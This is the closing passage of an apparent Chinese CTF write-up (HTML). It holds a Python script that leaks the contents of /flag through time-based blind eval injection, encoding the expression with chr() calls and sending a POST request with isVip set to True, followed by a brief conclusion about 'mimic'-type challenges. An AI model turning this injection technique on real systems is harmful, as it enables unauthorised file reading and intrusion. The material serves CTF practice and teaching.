    <span class="k">return</span> <span class="s2">"+"</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s2">"chr(</span><span class="si">%d</span><span class="s2">)"</span><span class="o">%</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">])</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s1">''</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">'{_}'</span><span class="p">:</span>
        <span class="n">exp</span> <span class="o">=</span> <span class="s2">"__import__('time').sleep(3) if open('/flag').read()[</span><span class="si">%d</span><span class="s2">]=='</span><span class="si">%s</span><span class="s2">' else 1"</span><span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">"expression"</span><span class="p">:</span> <span class="s2">"eval("</span> <span class="o">+</span> <span class="n">foo</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span> <span class="o">+</span> <span class="s2">")"</span><span class="p">,</span>
            <span class="s2">"isVip"</span><span class="p">:</span><span class="bp">True</span>
        <span class="p">}</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
            <span class="c1">#print r.elapsed</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
            <span class="k">print</span> <span class="s2">"[+] flag:"</span><span class="p">,</span><span class="n">flag</span>
            <span class="k">break</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190617230914-de83ee6c-9111-1.png"/></p>
<h2 data-content="1" id="932c8d9fb8c2fc43c9fbc3e8151ebc4c">总结</h2>
<p>拟态型的题目相信之后的比赛会更多的出现，这两题算是小试牛刀吧，期待之后比赛遇到的新题目。</p>
</div>
</div>